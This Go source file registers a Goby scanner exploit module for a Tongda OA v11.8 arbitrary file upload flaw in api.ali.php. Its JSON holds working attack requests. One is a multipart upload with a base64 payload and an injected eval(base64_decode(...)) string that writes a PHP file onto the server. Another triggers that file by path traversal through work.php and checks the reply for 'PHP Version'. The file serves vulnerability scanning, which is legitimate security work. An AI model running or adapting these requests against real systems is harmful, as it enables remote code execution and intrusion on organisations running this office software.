package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "通达OA v11.8 api.ali.php 任意文件上传漏洞",
  "Description": "",
  "Product": "",
  "Homepage": "",
  "DisclosureDate": null,
  "Author": "清晨",
  "FofaQuery": "app=\"TDXK-通达OA\" || app=\"通达OA网络智能办公系统\" || product=\"TDXK-通达OA\" || product=\"通达OA网络智能办公系统\"",
  "GobyQuery": "app=\"TDXK-通达OA\" || app=\"通达OA网络智能办公系统\" || product=\"TDXK-通达OA\" || product=\"通达OA网络智能办公系统\"",
  "Level": "3",
  "Impact": "",
  "Recommendation": "",
  "References": [],
  "Is0day": false,
  "HasExp": false,
  "ExpParams": [],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/mobile/api/api.ali.php",
        "follow_redirect": true,
        "header": {
          "Content-Type": "multipart/form-data; boundary=502f67681799b07e4de6b503655f5cae"
        },
        "data_type": "text",
        "data": "--502f67681799b07e4de6b503655f5cae\nContent-Disposition: form-data; name=\"file\"; filename=\"fb6790f4.json\"\nContent-Type: application/octet-stream\n\n{\"modular\":\"AllVariable\",\"a\":\"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL3Rlc3QwMDEucGhwJywnPD9waHAgcGhwaW5mbygpOz8+Jyk7\",\"dataAnalysis\":\"{\\\"a\\\":\\\"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\\\"}\"}\n--502f67681799b07e4de6b503655f5cae--"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    },
    {
      "Request": {
        "method": "GET",
        "uri": "/inc/package/work.php?id=../../../../../myoa/attach/approve_center/2304/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.test001",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "PHP Version",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/test.php",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "test",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "Tags": [],
  "VulType": [],
  "CVEIDs": [
    ""
  ],
  "CNNVD": [
    ""
  ],
  "CNVD": [
    ""
  ],
  "CVSSScore": "",
  "Translation": {
    "CN": {
      "Name": "通达OA v11.8 api.ali.php 任意文件上传漏洞",
      "Product": "",
      "Description": "",
      "Recommendation": "",
      "Impact": "",
      "VulType": [],
      "Tags": []
    },
    "EN": {
      "Name": "tongda OA v11.8 api.ali.php file upload",
      "Product": "",
      "Description": "",
      "Recommendation": "",
      "Impact": "",
      "VulType": [],
      "Tags": []
    }
  },
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}